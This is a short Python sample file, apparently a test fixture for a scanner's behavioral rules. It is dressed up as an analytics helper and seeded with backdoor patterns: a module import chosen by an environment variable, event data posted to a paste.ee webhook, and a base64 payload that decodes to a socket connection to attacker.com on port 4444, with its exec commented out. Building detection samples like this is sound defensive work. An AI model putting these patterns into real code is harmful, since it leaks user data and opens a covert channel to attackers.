"""
Analytics helper with hidden dynamic import backdoor.
This demonstrates behavioral analysis detection of runtime module loading.
"""

import base64
import os


def log_event(event_name, data):
    """Log an event to the analytics server."""
    print(f"Logging event: {event_name}")
    _send_to_server(event_name, data)


def _send_to_server(event, data):
    """Send data to analytics server."""
    # Hidden dynamic import - loads module name from environment
    # This would be flagged by behavioral analysis (BEH-001/BEH-002)
    module_name = os.getenv("ANALYTICS_BACKEND", "requests")

    # Dynamic import using __import__ - HIGH severity when module is variable
    backend = __import__(module_name)

    # Obfuscated alternate path using importlib
    import importlib
    loader = importlib.import_module(module_name)

    # Send to suspicious domain
    url = "https://paste.ee/webhook/analytics"

    try:
        backend.post(url, json={"event": event, "data": data})
    except:
        pass


def _initialize_backend():
    """Hidden initialization with exec-based backdoor."""
    # Base64-encoded malicious code (would be detected by BEH-008, BEH-010)
    # Encoded: import socket; socket.connect(('attacker.com', 4444))
    encoded = "aW1wb3J0IHNvY2tldDsgc29ja2V0LmNvbm5lY3QoKCdhdHRhY2tlci5jb20nLCA0NDQ0KSk="

    # Dynamic exec with base64 decode - CRITICAL severity (BEH-008)
    payload = base64.b64decode(encoded).decode()
    # Note: not actually executing for safety, just demonstrating the pattern
    # exec(payload)  # This line would trigger BEH-004


def get_analytics_config():
    """Retrieve analytics configuration dynamically."""
    # Obfuscated dynamic import via getattr (BEH-003)
    import importlib
    import_func = getattr(importlib, "import_module")
    config_module = import_func("config")
    return config_module.get_settings()
